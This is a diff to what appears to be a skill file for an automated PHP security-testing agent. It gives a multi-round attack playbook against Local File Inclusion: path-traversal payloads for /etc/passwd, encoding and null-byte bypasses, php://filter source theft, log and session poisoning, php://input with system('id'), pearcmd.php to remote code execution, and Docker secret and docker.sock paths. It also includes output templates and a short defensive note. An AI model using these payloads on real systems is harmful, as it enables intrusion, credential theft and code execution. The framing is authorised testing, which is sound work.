@@ -2,7 +2,34 @@
 > **Input**: attack_plans/{sink_id}_plan.json, Docker container access
 > **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py
 
+
+## Identity
+
+| Field | Value |
+|-------|-------|
+| Skill ID | S-043-B |
+| Phase | Phase-4 (Attack) |
+| Responsibility | Execute progressive multi-round attack against Local File Inclusion sinks |
+
+## Input Contract
+
+| File | Source | Required | Fields Used |
+|------|--------|----------|-------------|
+| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
+| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
+| Container | Docker `php` container | ✅ | `exec` access |
+
 ## 8 Rounds of Attack
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R1 - Basic Path Traversal
 
@@ -14,6 +41,16 @@ Payload:
 - `../../../../../../../etc/passwd`
 
 Inject into all parameters flowing into target functions. Send requests testing GET, POST, and Cookie vectors. Increment `../` depth from 3 to 10 levels. Confirm via response content if response contains `root:x:0:0`.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R2 - URL Encoding & Double Encoding
 
@@ -27,6 +64,16 @@ Payload:
 
 Apply each encoding variant to the traversal paths from R1. Send encoding variants one by one, testing both full and partial encoding.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R3 - PHP Filter Protocol Source Code Reading
 
 Objective: Export PHP source code via php://filter.
@@ -39,6 +86,16 @@ Payload:
 
 Decode Base64 responses and verify whether they contain PHP source code. Enumerate common filenames: index.php, config.php, db.php, .env, wp-config.php.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R4 - Null Byte Truncation
 
 Objective: Bypass suffix appending (PHP < 5.3.4).
@@ -49,6 +106,16 @@ Payload:
 - `../../../etc/passwd\0`
 
 Exploit scenarios where the application appends `.php` or other extensions. The null byte truncates the string at the OS level. Only send null byte payloads when PHP version < 5.3.4 or version is unknown.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R5 - Path Canonicalization Bypass
 
@@ -62,6 +129,16 @@ Payload:
 - Mixed separators: `../..\/etc/passwd`
 
 Exploit inconsistencies between filter parsing and OS path resolution.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R6 - Log File Injection + Inclusion
 
@@ -77,6 +154,16 @@ Steps:
 
 Confirm code execution via response output if `uid=` appears in the response. Can be combined with R2 encoding to bypass direct path filters.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R7 - Session File & Environ Inclusion
 
 Objective: Include session files or /proc/self/environ to achieve code execution.
@@ -91,6 +178,16 @@ Proc environ inclusion:
 
 Also send requests one by one to test file descriptor inclusion from `/proc/self/fd/0` to `/proc/self/fd/10`.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R8 - Phar/Data/Input Protocol Combination
 
 Objective: Achieve code execution through advanced PHP protocol wrappers.
@@ -102,6 +199,16 @@ Payload:
 - `php://input` (POST body: `<?php system('id'); ?>`)
 
 phar: Upload a phar archive with a .jpg extension, include via phar://. data/input: Use when allow_url_include is enabled.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R9 - PHP Filter Chain Arbitrary File Read (Enhanced)
 
@@ -118,6 +225,16 @@ Advanced php://filter techniques:
 - **File fingerprinting**: Determine file existence based on filter error/success
 - **Binary file reading**: `php://filter/convert.base64-encode` to read non-text files
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R10 - pearcmd.php Exploitation
 
 Exploit PHP's built-in pearcmd.php to achieve LFI → RCE:
@@ -131,6 +248,16 @@ Exploit PHP's built-in pearcmd.php to achieve LFI → RCE:
 - Then include the written file via LFI
 - Common paths: `/usr/local/lib/php/pearcmd.php`, `/usr/share/php/pearcmd.php`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R11 - Container / Docker Specific Paths
 
 Special exploitation paths in Docker environments:
@@ -143,6 +270,16 @@ Special exploitation paths in Docker environments:
 - `/run/secrets/*` → Docker Secrets
 - `/.dockerenv` → Container identification file
 - `/var/run/docker.sock` → Docker Socket (container escape)
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R12 - Windows Specific Paths (Extended Coverage)
 
@@ -772,6 +909,64 @@ $result = call_python_service("read_template", $safe_name);
 
 > The essence of WAF bypass is exploiting the difference between WAF parsing and backend application parsing (parser differential). The most effective defense is not stacking rules at the WAF layer, but using whitelist + `realpath()` strict comparison at the application layer. For mixed-language projects, path security checks MUST be independently implemented at each layer (PHP, Python, Node), because path handling semantics may be completely different across cross-language calls. Python's `os.path.join` absolute path override is one of the most easily overlooked cross-layer vulnerabilities.
 
+
+
+## Output Contract
+
+| Output File | Path | Description |
+|-------------|------|-------------|
+| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
+| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
+| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |
+
+## Examples
+
+### ✅ GOOD Example — Complete, Valid Exploit Result
+
+```json
+{
+  "sink_id": "lfi_include_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 3,
+  "successful_round": 1,
+  "payload": "../../../../../../etc/passwd",
+  "evidence_result": "root:x:0:0:root:/root:/bin/bash returned in response body",
+  "severity": {
+    "level": "H",
+    "score": 2.25,
+    "cvss": 7.5
+  }
+}
+```
+
+**Why this is good:**
+- `evidence_result` contains specific, verifiable proof of exploitation
+- `severity` scoring is consistent: score 2.25 → cvss 7.5 → level `H`
+- `rounds_executed` shows progressive effort, not a single blind attempt
+- All required fields are populated with concrete values
+
+### ❌ BAD Example — Incomplete, Invalid Exploit Result
+
+```json
+{
+  "sink_id": "lfi_include_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 1,
+  "successful_round": 1,
+  "payload": "../etc/passwd",
+  "evidence_result": "",
+  "failure_reason": "",
+  "severity": {
+    "level": "L",
+    "score": null
+  }
+}
+```
+
+**Issues:**
+- evidence_result is empty — no file content shown as proof
+- failure_reason is empty — no explanation provided
+- severity_level 'L' for confirmed LFI reading /etc/passwd — should be H or C
 
 ---
 
